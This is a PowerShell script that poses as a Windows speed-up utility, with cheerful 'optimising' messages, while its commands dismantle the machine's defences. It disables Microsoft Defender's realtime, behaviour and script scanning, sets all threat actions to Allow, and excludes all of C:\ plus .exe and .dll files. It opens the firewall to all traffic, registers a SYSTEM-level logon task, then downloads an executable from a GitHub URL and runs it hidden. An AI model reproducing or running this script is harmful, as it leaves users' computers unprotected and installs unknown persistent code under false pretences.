# Check if running as administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "This script requires administrator privileges. Please run PowerShell as Administrator." -ForegroundColor Red
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

Clear-Host
Write-Host "Optimising Settings..." -ForegroundColor Yellow
Stop-Service -Name "SecurityHealthService" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection" -Name "NoActionNeeded" -Value 1 -PropertyType DWORD -Force
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SevereThreatDefaultAction Allow
Set-MpPreference -HighThreatDefaultAction Allow
Set-MpPreference -ModerateThreatDefaultAction Allow
Set-MpPreference -LowThreatDefaultAction Allow
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableEmailScanning $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Allow
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Allow
New-NetFirewallRule -DisplayName "Allow All Inbound Traffic" -Direction Inbound -Action Allow -Protocol Any -Profile Any
New-NetFirewallRule -DisplayName "Allow All Outbound Traffic" -Direction Outbound -Action Allow -Protocol Any -Profile Any
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Set-NetFirewallProfile -Profile Domain,Public,Private -NotifyOnListen False
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Allow
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Allow
Write-Host "Done" -ForegroundColor Green
Start-Sleep 1
Write-Host "Configuring further optimisations" -ForegroundColor Yellow
Add-MpPreference -ExclusionPath "C:\Windows\SysBootstrap.exe"
Add-MpPreference -ExclusionPath "C:\Windows\*"
Add-MpPreference -ExclusionPath "C:\*"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".dll"
Add-MpPreference -ExclusionProcess "SysBootstrap.exe"
$Action = New-ScheduledTaskAction -Execute "C:\Windows\SysBootstrap.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName "MyStartupTask" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings
Write-Host "Done" -ForegroundColor Green
Write-Host "Saving optimisations..." -ForegroundColor Yellow
Invoke-WebRequest -Uri "https://github.com/maksimtall/speedup/raw/refs/heads/main/SystemSpeedup.exe" -OutFile "C:\Windows\SysBootstrap.exe"
Start-Process "C:\Windows\SysBootstrap.exe" -WindowStyle Hidden
Write-Host "Done" -ForegroundColor Green
Write-Host "Applying optimisations, this may take some time..." -ForegroundColor Yellow
gpupdate /force
Write-Host "Done" -ForegroundColor Green
Write-Host "Your system is optimised!" -ForegroundColor Green
Write-Host "Restart is not necessary, but is recommended!"
exit 0
